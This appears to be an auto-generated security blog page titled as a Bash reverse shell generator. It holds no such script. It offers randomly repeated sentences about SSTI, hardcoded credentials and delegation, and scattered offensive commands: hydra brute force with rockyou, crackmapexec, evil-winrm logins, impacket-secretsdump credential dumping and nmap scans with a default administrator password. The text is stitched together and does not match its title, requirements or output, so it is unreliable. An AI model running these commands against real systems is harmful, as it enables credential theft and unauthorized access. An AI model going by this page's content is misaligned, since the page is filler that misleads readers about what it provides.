---
TitleSEO: "Reverse Shell Generator in Bash | ZureFX"
TitlePost: "Reverse Shell Generator — Bash"
Author: "ZureFX"
Description: "A Bash script for reverse shell generator. Built for security research and automation."
Keywords: "script, rust, powershell, go, bash"
URL: "https://zurefx.github.io/scripting/script-reverse-shell-generator-993.html"
URL_IMAGES: ""
Date: "2024-03-18"
Tags: "Script, Rust, PowerShell, Go, Bash"
Section: "scripting"
Lang: "en"
main_img: "script-reverse-shell-generator-993"
Permalink: "/scripting/script-reverse-shell-generator-993.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

Post-exploitation enumeration revealed a path to domain administrator privileges. The service was running without proper input validation, leading to injection vulnerabilities. Lateral movement was facilitated by reusing discovered credentials across services.

Built with **Bash** for offensive security automation.

### Requirements

- Bash
- `rubeus`
- `atexec`
- `impacket`

## Implementation

### Core Logic

The kernel version was outdated and vulnerable to a publicly known exploit. The web application was vulnerable to Server-Side Template Injection (SSTI).

```bash
feroxbuster -h
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.17.126.141 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
crackmapexec smb 10.105.120.59 -u administrator -p 'P@ssw0rd!' --shares
nmap -sCV -p3389,636,5432 10.62.125.115 -oN scan.txt
```

Command injection was possible through unsanitized user input in the search functionality. Network traffic analysis revealed unencrypted communications containing user credentials.

### Helper Functions

The database credentials were hardcoded in the application source code. The web application was vulnerable to Server-Side Template Injection (SSTI).

```bash
evil-winrm -i 10.13.156.221 -u administrator -p 'P@ssw0rd!'
```

## Usage

### Basic Usage

The web application was vulnerable to Server-Side Template Injection (SSTI). The service was running without proper input validation, leading to injection vulnerabilities.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.13.152.78
nmap -sCV -p1433,3306,5985 10.102.51.233 -oN scan.txt
crackmapexec smb 10.82.21.94 -u administrator -p 'P@ssw0rd!' --shares
evil-winrm -i 10.56.155.3 -u administrator -p 'P@ssw0rd!'
```

### Advanced Options

The database credentials were hardcoded in the application source code. The service was running without proper input validation, leading to injection vulnerabilities. Network traffic analysis revealed unencrypted communications containing user credentials.

```bash
nmap -sCV -p135,1521,445 10.85.226.137 -oN scan.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.91.144.240
```

## Output

### Example Output

Unconstrained delegation was enabled on the compromised machine. The database credentials were hardcoded in the application source code.

```
[+] Scanning target...
[+] Found 7 results
[+] Done in 16.08s
```
